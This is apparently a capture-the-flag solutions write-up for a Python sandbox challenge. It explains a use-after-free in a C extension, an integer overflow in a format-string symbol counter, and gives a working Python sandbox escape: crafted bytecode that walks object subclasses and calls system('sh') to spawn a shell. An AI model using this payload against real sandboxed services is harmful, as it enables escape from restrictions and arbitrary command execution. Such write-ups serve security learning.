# Solutions
## Author solution
The intended solution was to use the UAF on line 98
```c
        char *repr = PyUnicode_AsUTF8(curr);
        Py_DECREF(curr);
```
If the string `curr` only had one reference, the call to `Py_DECREF` would free it. `add_string` could then subsequently call `strlen`, `realloc` and `strcpy`.

To actually use the UAF, you could create a subinstance of `str`, which places the actual data contents separately, which means that when the data is freed, the first 8 bytes are replaced with a pointer. The `strlen` call will then return 6, but after the `realloc` the string will be bigger, leading to heap overflow.

## Solution by @UDP
You could create a 4 GB sized format string like `'{}'*0x80000000` which would overflow the counter in `count_symbols`, leading to a count of 0. This could be used to overflow the arguments tuple and call `PyObject_Str` on a fake object.

## Solution by @Lyndon
`Maple Bacon` realized that while other frames were sanitized in the sandbox, `ag_code` was not, which could be used to create an arbitrary code object and execute it.

```py
Test = type('test', (object, ), {'__aiter__': lambda self: self, '__anext__': None})
code = (a async for a in Test()).ag_code
code = code.replace(
    co_argcount=0,
    co_code=b'd\x01j\x00j\x01\xa0\x02\xa1\x00D\x00]\x0f}\x00|\x00j\x03d\x02k\x02r\x15|\x00j\x04j\x05d\x03\x19\x00d\x04\x83\x01\x01\x00q\x06d\x00S\x00',
    co_consts=(None, (), '_wrap_close', 'system', 'sh'),
    co_names=('__class__', '__base__', '__subclasses__', '__name__', '__init__', '__globals__'),
    co_nlocals=1,
    co_varnames=('cls',)
)
type(lambda: 0)(code, {})().asend(None).send(None)
```